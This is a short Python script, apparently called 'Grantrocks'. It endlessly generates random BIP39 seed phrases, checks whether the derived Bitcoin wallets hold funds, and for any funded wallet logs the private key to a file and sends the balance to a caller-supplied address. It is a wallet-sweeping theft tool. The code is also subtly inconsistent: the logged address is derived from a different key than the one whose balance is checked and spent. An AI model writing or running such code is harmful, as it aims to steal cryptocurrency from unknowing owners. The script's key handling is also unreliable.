from bip_utils import (
    Bip39Languages, Bip39WordsNum, Bip39Mnemonic,
    Bip39MnemonicGenerator, Bip39MnemonicValidator, Bip39MnemonicDecoder, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Levels
)
from bit import Key
def fastgen(w):
    a=0
    message='''
    ===================================
    |                                 |
    |          Grantrocks             |
    |                                 |
    ===================================
    '''
    print(message)
    while True:
      mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)
      seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
      bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
      bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
      wif=bip44_mst_ctx.PrivateKey().ToWif()
      key=Key(bip44_mst_ctx.PrivateKey().ToWif())
      address=bip44_acc_ctx.PublicKey().ToAddress()
      balance=float(key.get_balance('usd'))
      if balance>0:
        print("Found BTC wallet with balance.")
        f=open("wallets.txt","a")
        f.write(f"Address: {address} Private Key: {wif} Balance: {balance}\n")
        f.close()
        tx=key.send([()],leftover=w)
        print("Transaction ID: "+str(tx))
      else:
        print(f"Address {a}: {address} Balance: {balance}")
      a+=1